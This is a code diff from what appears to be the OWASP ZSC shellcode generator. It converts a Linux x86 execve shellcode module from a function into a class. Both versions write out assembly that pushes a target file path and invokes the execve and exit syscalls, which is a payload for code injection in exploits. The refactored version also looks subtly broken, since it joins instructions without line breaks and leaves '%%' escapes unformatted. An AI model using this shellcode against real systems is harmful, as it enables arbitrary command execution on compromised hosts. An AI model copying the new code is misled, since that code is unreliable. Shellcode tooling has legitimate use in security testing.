@@ -7,29 +7,27 @@ http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 """
 from cores import stack
+from new_cores import base_module
 
 
-def exc(file_to_exec):
-    return """
-%s
-mov    %%esp,%%ebx
-xor    %%eax,%%eax
-push   %%eax
-mov    %%esp,%%edx
-push   %%ebx
-mov    %%esp,%%ecx
-push   %%edx
-push   %%ecx
-push   %%ebx
-mov    $0x3b,%%al
-push   $0x2a
-int    $0x80
-mov    $0x1,%%al
-mov    $0x1,%%bl
-int    $0x80
-""" % file_to_exec
+class Module(base_module.BaseModule):
+    file_dest = base_module.OptString("", "Destination file")
 
-
-def run(data):
-    file_to_exec = data[0]
-    return exc(stack.generate(file_to_exec, '%ebx', 'string'))
+    def generate(self):
+        payload = stack.generate(self.file_dest, '%ebx', 'string')
+        payload += "mov    %%esp,%%ebx"
+        payload += "xor    %%eax,%%eax"
+        payload += "push   %%eax"
+        payload += "mov    %%esp,%%edx"
+        payload += "push   %%ebx"
+        payload += "mov    %%esp,%%ecx"
+        payload += "push   %%edx"
+        payload += "push   %%ecx"
+        payload += "push   %%ebx"
+        payload += "mov    $0x3b,%%al"
+        payload += "push   $0x2a"
+        payload += "int    $0x80"
+        payload += "mov    $0x1,%%al"
+        payload += "mov    $0x1,%%bl"
+        payload += "int    $0x80"
+        return payload
